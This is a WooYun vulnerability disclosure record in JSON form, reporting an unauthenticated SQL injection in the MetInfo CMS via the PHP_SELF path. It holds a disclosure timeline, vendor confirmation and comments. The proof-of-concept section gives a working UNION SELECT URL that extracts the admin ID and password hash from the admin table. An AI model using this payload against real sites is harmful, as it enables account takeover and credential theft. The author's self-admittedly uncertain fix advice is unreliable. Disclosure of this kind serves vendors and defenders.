{"id": 88533, "wybug_id": "wooyun-2016-0193924", "wybug_title": "Metinfo 最新版 前台无需登录注入一枚(直接出任意数据)                                      ", "wybug_corp": "MetInfo", "wybug_author": "′雨。", "wybug_date": "2016-04-11 07:21", "wybug_open_date": "2016-07-10 09:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-14：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-06-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-10：\t细节向公众公开  简要描述： 直接出数据~ 详细说明：  system\\include\\compatible\\metv5_top.php中\n//获取当前应用栏目信息$PHP_SELF = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];$PHP_SELFs = explode('/', $PHP_SELF);$query = \"SELECT * FROM {$_M['table'][column]} where module!=0 and foldername = '{$PHP_SELFs[count($PHP_SELFs)-2]}' and lang='{$_M['lang']}'\";$column = DB::get_one($query);\n全局并没有过滤SERVER 但是PHP_SELF 其实是可以控制那么一小部分的。。$PHP_SELFs = explode('/', $PHP_SELF); 这里又切割成数组。$PHP_SELFs[count($PHP_SELFs)-2]  把这个带入了查询访问/member/login.php的时候 就会调用这个文件。   漏洞证明：  直接访问 http://localhost/metinfo/member/login.php/aa'UNION SELECT (select concat(admin_id,0x23,admin_pass) from met_admin_table limit 1),11113,11111,11111,11111,11111,11111,11111,11111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111%23/aa\n\n   修复方案：  别用php_self了。就用 $_SERVER['SCRIPT_NAME'] 把  这个好像是用户不能任意控制了的把?  不太清楚 你们自己研究下。   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-04-11 09:37 厂商回复： 感谢您的反馈，后续版本修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-11 07:52 |    \t\terhuo \t\t\t( 普通白帽子  |\t\t\t        Rank:164 漏洞数:39        | 666)\t\t \n  审核好努力啊，大早上的就起床审洞    \n     2016-04-11 08:47 |    \t\t镱鍚 \t\t\t( 普通白帽子  |\t\t\t        Rank:302 漏洞数:42        | 执手岁月留香，唱曲往事飞扬...)\t\t \n  前排膜拜    \n     2016-04-11 08:52 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:178 漏洞数:72        )\t\t \n  6    \n     2016-04-11 10:32 |    \t\tjs2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:126 漏洞数:44        | 闭关修炼。。。)\t\t \n  持续关注    \n     2016-04-11 11:02 |    \t\tmyhalo \t\t\t( 普通白帽子  |\t\t\t        Rank:331 漏洞数:59        | T-Safe呼朋伴友。)\t\t \n  是代码又更新了么    \n     2016-04-11 19:13 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        )\t\t \n  又来了，觉得像是姨妈。666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}